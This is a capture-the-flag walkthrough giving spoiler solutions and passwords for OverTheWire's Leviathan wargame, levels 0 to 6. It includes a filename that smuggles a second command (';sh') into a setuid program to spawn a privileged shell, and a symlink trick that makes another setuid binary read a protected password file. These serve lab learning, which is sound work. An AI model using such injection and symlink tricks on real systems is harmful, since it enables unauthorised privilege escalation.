# Solutions
**THERE ARE SPOILERS AHEAD.**

These are my full solutions to the [leviathan](https://overthewire.org/wargames/leviathan/) ctf wargame. This is an "introductory" wargame so most of the challenges are fairly easy if you're familiar with common linux commands. If you're not familiar with the linux commands already, this ctf can be challenging but doable if you read the man pages and follow the hints. **Don't be discouraged!** You're learning a new language.

There are also a lot of good resources online for this war game in case you get stuck. My solutions will be fairly terse, although I will try to point out interesting things I find.


## Level 0
We log in with the username and password `leviathan0` given to us by the prompt.

## Level 0 to Level 1
Taking a look around on the server, this CTF seems to be structured similarly to the `bandit` other wargames that have passwords in `/etc/leviathan_pass/<password_file>`. Unfortunately, we can't read the `/etc/leviathan_pass/leviathan1` file.

Looking at the current directory, we see the following:

```bash
leviathan0@leviathan:~$ ls -hartl
total 24K
-rw-r--r--  1 root       root        675 May 15  2017 .profile
-rw-r--r--  1 root       root       3.5K May 15  2017 .bashrc
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
drwxr-xr-x 10 root       root       4.0K Aug 26  2019 ..
drwxr-x---  2 leviathan1 leviathan0 4.0K Aug 26  2019 .backup
drwxr-xr-x  3 root       root       4.0K Aug 26  2019 .
```

If we take a look in `.profile`, `.bashrc`, `.bash_logout`, we don't really see anything that stands out. `.backup` looks suspicious though. Inside that hidden directory, it has 1 file, `bookmarks.html` which is absolutely full of junk. Let's go out on a limb and try `cat bookmarks.html | grep leviathan` and hope for the best. Lo and behold, we are rewarded with the following:

```
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

password: `rioGegei8m`

## Level 1 to Level 2
Looking in the main directory again, we see there's a file called `check`:

```bash
leviathan1@leviathan:~$ ls -hartl
total 28K
-rw-r--r--  1 root       root        675 May 15  2017 .profile
-rw-r--r--  1 root       root       3.5K May 15  2017 .bashrc
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
drwxr-xr-x 10 root       root       4.0K Aug 26  2019 ..
-r-sr-x---  1 leviathan2 leviathan1 7.3K Aug 26  2019 check
drwxr-xr-x  2 root       root       4.0K Aug 26  2019 .
```

It's a `setuid` binary which means that, if we can run it, it will run as the `leviathan2` user (the owner of the file). We can tell that by the `s` bit in the permissions section of the `check` file.

When we try to run it, it prompts us for a password. The current level's password does not work.

Going out on a limb again, let's look through `strings check` to see if anything stands out. There are a few things that looked like they may have been passwords, but none of them work if we try.

We're gonna get really desperate now and run `cat check`... on a binary file!? Yes. Scanning through, we see a LOT of garbage, but a few interesting words pop up. `sex`, `god`, `love`.

Running `check` and inputting `sex` for the password gives us a new prompt! Running `whoami` tells us that we are now `leviathan2`. Awesome. Time to get the password from `/etc/leviathan_pass/leviathan2`

password: `ougahZi8Ta`

## Level 2 to Level 3
Looking inside here, we again see a `setuid` binary called `printfile`. Running `printfile` alerts us to the fact that we need to give it a `filename` argument. Running `./printfile /etc/leviathan_pass/leviathan3` tells us that "cant have that file...". Hmm. `strings` and `cat` are no help here.

I had to do some googling for this one, and I found out about the `ltrace` command, which allows us to see what calls are made when we run a binary, like so:

```bash
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                     = -1
puts("You cant have that file..."You cant have that file...
)                              = 27
+++ exited (status 1) +++
```

```bash
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)                     = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
geteuid()                                                       = 12002
geteuid()                                                       = 12002
setreuid(12002, 12002)                                          = 0
system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                          = 0
+++ exited (status 0) +++
```

So, _if_ we had permission to the file, the system would run `/bin/cat <file>`. When we check for access, though, `printfile` tells us we don't have it. We can see that the system calls directly (without any sanitization). So, theoretically (and in actuality), we can make `printfile` run:

`/bin/cat /tmp/somedir/somefile;sh` which will plop us into the shell for `leviathan3`. We just need to

```
mkdir /tmp/somedir/
touch "/tmp/somedir/somefile;sh"
./printfile "/tmp/somedir/somefile;sh"
```

password: `Ahdiemoo1j`

There's also a slightly more in depth trick utilizing symlinks that can be found by googling for the solution to this level. I like my solution :).

## Level 3 to Level 4
Now we have an executable file called `level3` that prompts us for a password when we execute it. This level is pretty easy since we know about `ltrace`.  iIt tells us that the password we need to enter to the binary is `snlprintf` (look at the `strcmp` below):
 i
```bash
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                      = -1
printf("Enter the password> ")                                  = 20
fgets(Enter the password> dumb
"dumb\n", 256, 0xf7fc55a0)                                = 0xffffd590
strcmp("dumb\n", "snlprintf\n")                                 = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                      = 19
+++ exited (status 0) +++
```

Utilizing that password gives us the `leviathan4` shell from which we can `cat /etc/leviathan_pass/leviathan4`.

password: `vuH0coox6m`

## Level 4 to Level 5
No executable this time. This time we find a `.trash` directory. Let's go dumpster diving! Inside `./trash` we see a binary called `bin`. Running it gives binary output.

```bash
leviathan4@leviathan:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
```

Let's convert it to an ascii string and see what happens. I just threw the output into [this converter](https://www.binaryhexconverter.com/binary-to-ascii-text-converter) and got the output: `Tith4cokei`.

Lucky us, that's the password!

password: `Tith4cokei`

## Level 5 to Level 6
Another level, another `setuid` binary! This one looks for a `/tmp/file.log` which doesn't exist:

```bash
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                     = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                               = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

If we make that file, we get the following:

```bash
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                     = 0x804b008
fgetc(0x804b008)                                                = '\377'
feof(0x804b008)                                                 = 1
fclose(0x804b008)                                               = 0
getuid()                                                        = 12005
setuid(12005)                                                   = 0
unlink("/tmp/file.log")                                         = 0
+++ exited (status 0) +++
```

Hmm... let's put something in the file.

```bash
leviathan5@leviathan:~$ echo "test" > /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
test
```

So, it seems like it just outputs whatever is in /tmp/file.log. Now finally seems like a good time for symbolic links (which I definitely don't remember how to create, so I google it). The format is like this: `ln -s source_file myfile`

```bash
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
```

password: `UgaoFee4li`

